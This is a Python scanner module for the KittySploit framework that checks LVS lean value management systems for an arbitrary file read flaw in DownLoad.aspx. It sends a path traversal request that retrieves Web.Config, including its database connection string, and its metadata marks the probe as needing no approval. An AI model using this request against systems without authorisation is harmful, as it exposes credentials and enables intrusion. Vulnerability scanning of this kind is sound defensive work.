#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LVS lean value management system DownLoad."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LVS DownLoad.aspx - Local File Inclusion (LFI) Detection',
        'description': 'LVS lean value management system DownLoad.aspx has an arbitrary file reading vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'lvs', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/LVS%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDownLoad.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md#lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdownloadaspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E',
        ],
    }

    def run(self):
        path = '/Business/DownLoad.aspx?p=UploadFile/../Web.Config'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('<configuration>', '<appSettings>', '<add key="SqlConnString"',)
        ctype_any = ('application/ms-excel',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='high',
                reason='LVS DownLoad.aspx - Local File Inclusion (LFI) detected',
                path=path,
            )
            return True
        return False

